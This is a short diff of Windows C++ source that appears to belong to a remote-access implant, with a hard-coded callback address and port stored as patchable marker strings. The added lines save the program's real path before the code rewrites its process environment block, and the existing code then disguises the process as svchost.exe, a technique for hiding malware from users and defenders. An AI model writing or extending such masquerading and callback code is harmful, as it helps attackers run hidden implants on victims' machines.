@@ -13,6 +13,8 @@ char gDomain[100] = "BLACKHAWK:10.211.55.2\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 int gOffsetPort = 12;
 char gPort[100] = "HAWKISBLACK:18000\0\0\0\0\0";
 
+// 存放修改peb之前的原路径
+char g_szCurrentDirectory[MAX_PATH];
 
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
@@ -24,6 +26,9 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	if (!IsReady()) {
 		return -1;
 	}
+
+	// 修改peb之前 拿到自身正确地址
+	::GetModuleFileName(NULL, g_szCurrentDirectory, MAX_PATH);
 
 	// 修改PEB伪装进程信息
 	DisguiseProcess((wchar_t*)L"C:\\WINDOWS\\System32\\svchost.exe (LocalSevices -p)",
